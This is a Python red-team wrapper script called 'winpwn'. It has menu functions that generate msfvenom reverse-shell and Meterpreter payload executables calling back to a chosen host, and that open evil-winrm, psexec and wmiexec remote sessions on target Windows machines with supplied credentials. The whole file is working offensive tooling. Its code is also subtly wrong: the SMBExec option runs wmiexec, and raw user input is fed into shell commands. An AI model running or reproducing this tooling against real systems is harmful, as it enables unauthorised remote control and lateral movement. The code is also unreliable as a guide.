#!/usr/bin/env python3
import os
from sys import exit
from time import sleep
from termcolor import colored
from subprocess import Popen, PIPE
#############################################################################################################################################################
## The purpose of this script is to serve as a wrapper script for Impacket, EvilWinRM, msfvenom, PowerShell Empire, and other Windows / Red Teaming tools. ##
## This will help to speed things up when working in a Windows environment. It will also help keep everything in a one-stop shop for ease of use.          ##
## Goals for this project:                                                                                                                                 ##
## 1. Automate the use of common Windows PenTesting/RedTeaming tools                                                                                       ##
## 2. Create a user-friendly interface for tools                                                                                                           ##
## 3. Give the user the ability to add their own functionality if needed                                                                                   ##
#############################################################################################################################################################

banner = """
 __    __  ____  ____   ____  __    __  ____       ____  __ __     
|  |__|  ||    ||    \ |    \|  |__|  ||    \     |    \|  |  |    
|  |  |  | |  | |  _  ||  o  )  |  |  ||  _  |    |  o  )  |  |    
|  |  |  | |  | |  |  ||   _/|  |  |  ||  |  |    |   _/|  ~  |    
|  `  '  | |  | |  |  ||  |  |  `  '  ||  |  | __ |  |  |___, |    
 \      /  |  | |  |  ||  |   \      / |  |  ||  ||  |  |     |    
  \_/\_/  |____||__|__||__|    \_/\_/  |__|__||__||__|  |____/     
                                                                   
                                            @rootshooter v1.0                                                               
"""

def clear_screen():
    os.system("/usr/bin/clear")

menu_options = {
    1: 'Generate Reverse Shell Binary (msfvenom)',
    2: 'Launch Metasploit Framework',
    3: 'Launch Evil-WinRM Session',
    4: 'Launch PSExec Session',
    5: 'Launch WMIExec Session',
    6: 'Launch SMBExec Session',
    0: 'Exit',
}

def main_menu():
    for key in menu_options.keys():
        print(f"{key}. {menu_options[key]}")

## Generates a malicious executable using msfvenom
## Prompts the user for input and assigns to variables
## Differentiates between the different architectures
## Uses Popen to execute the appropriate command and waits until it's complete
def shellgen():
    try:
        clear_screen()
        print("\n[!] Do you want Shell or Meterpreter? [s/m]")
        choice = input("[winpwn]> ")
        if choice == 's':
            print("[!] Please enter LHOST")
            lhost = input("[winpwn]> ")
            print("[!] Please enter LPORT")
            lport = input("[winpwn]> ")
            print("[!] Please enter ARCH (x86/x64)")
            arch = input("[winpwn]> ")
            shell = f"/usr/bin/msfvenom --platform windows -p windows/shell/reverse_tcp LHOST={lhost} LPORT={lport} EXITFUNC=thread -a {arch} -o shell.exe"
            shell64 = f"/usr/bin/msfvenom --platform windows -p windows/x64/shell/reverse_tcp LHOST={lhost} LPORT={lport} EXITFUNC=thread -a {arch} -o shell.exe"
            print("[+] Generating malicious binary...\n")
            if arch == "x86":
                try:
                    cmd = Popen([shell], shell=True)
                    cmd.wait()
                except Exception as error:
                    print(f"[*] {error}")
            elif arch == "x64":
                try:
                    cmd = Popen([shell64], shell=True)
                    cmd.wait()
                except Exception as error:
                    print(f"[*] {error}")
            else:
                print("[*] Invalid architecture! Please enter a valid option\n")
        elif choice == 'm':
            print("[!] Please enter LHOST")
            lhost = input("[winpwn]> ")
            print("[!] Please enter LPORT")
            lport = input("[winpwn]> ")            
            print("[!] Please enter ARCH (x86/x64)")
            arch = input("[winpwn]> ")
            meterp = f"/usr/bin/msfvenom --platform windows -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} EXITFUNC=thread -a {arch} -o meterpreter.exe"
            meterp64 = f"/usr/bin/msfvenom --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} EXITFUNC=thread -a {arch} -o meterpreter.exe"
            print("[+] Generating malicious binary...\n")
            if arch == "x86":
                try:
                    cmd = Popen([meterp], shell=True)
                    cmd.wait()
                except Exception as error:
                    print(f"[*] {error}")
            elif arch == "x64":
                try:
                    cmd = Popen([meterp64], shell=True)
                    cmd.wait()
                except Exception as error:
                    print(f"[*] {error}")
            else:
                print("[*] Invalid architecture! Please enter a valid option\n")
        else:
            print("[*] Invalid option!\n")
    except Exception as error:
        print(f"[*] {error}")

def msflaunch():
    try:
        msflaunch = "/usr/bin/xfce4-terminal -T 'msfconsole' -x /usr/bin/msfconsole &" 
        cmd = Popen([msflaunch], shell=True)
        cmd.wait()
        clear_screen()
    except Exception as error:
        print(f"[*] {error}")

def winrmlaunch():
    try:
        print("[!] Please enter target IP address")
        tgt_ip = input("[winpwn]> ")
        print("[!] Please enter target username")
        user = input("[winpwn]> ")
        print("[!] Please enter target password")
        passwd = input("[winpwn]> ")
        winrmlaunch = f"/usr/local/bin/evil-winrm -i {tgt_ip} -u {user} -p {passwd}"
        cmd = Popen([winrmlaunch], shell=True)
        cmd.wait()
        clear_screen()
    except Exception as error:
        print(f"[!] {error}")

def psexeclaunch():
    try:
        print("[!] Please enter target IP address")
        tgt_ip = input("[winpwn]> ")
        print("[!] Please enter target domain name")
        domain = input("[winpwn]> ")
        print("[!] Please enter target username")
        user = input("[winpwn]> ")
        print("[!] Please enter target password")
        passwd = input("[winpwn]> ")
        psexeclaunch = f"/usr/local/bin/psexec.py {domain}/{user}:'{passwd}'@{tgt_ip}"
        cmd = Popen([psexeclaunch], shell=True)
        cmd.wait()
        clear_screen()
    except Exception as error:
        print(f"[!] {error}")

def wexeclaunch():
    try:
        print("[!] Please enter target IP address")
        tgt_ip = input("[winpwn]> ")
        print("[!] Please enter target domain name")
        domain = input("[winpwn]> ")
        print("[!] Please enter target username")
        user = input("[winpwn]> ")
        print("[!] Please enter target password")
        passwd = input("[winpwn]> ")
        wexeclaunch = f"/usr/local/bin/wmiexec.py {domain}/{user}:'{passwd}'@{tgt_ip}"
        cmd = Popen([wexeclaunch], shell=True)
        cmd.wait()
        clear_screen()
    except Exception as error:
        print(f"[!] {error}")
        
def sexeclaunch():
    try:
        print("[!] Please enter target IP address")
        tgt_ip = input("[winpwn]> ")
        print("[!] Please enter target domain name")
        domain = input("[winpwn]> ")
        print("[!] Please enter target username")
        user = input("[winpwn]> ")
        print("[!] Please enter target password")
        passwd = input("[winpwn]> ")
        sexeclaunch = f"/usr/local/bin/wmiexec.py {domain}/{user}:'{passwd}'@{tgt_ip}"
        cmd = Popen([sexeclaunch], shell=True)
        cmd.wait()
        clear_screen()
    except Exception as error:
        print(f"[!] {error}")
       
def prog_exit():
    exit()

def main():
    print(banner)
    while True:
        main_menu()
        choice = ""
        try:
            choice = int(input("\n[winpwn]> "))
        except KeyError:
            print("[-] Please choose a valid option!")
        if choice == 1:
            shellgen()
        elif choice == 2:
            msflaunch()
        elif choice == 3:
            winrmlaunch()
        elif choice == 4:
            psexeclaunch()
        elif choice == 5:
            wexeclaunch()
        elif choice == 6:
            sexeclaunch()
        elif choice == 0:
            prog_exit()
        else:
            print("[-] Invalid options! Please make a valid selection.")

if __name__ == "__main__":
    main()
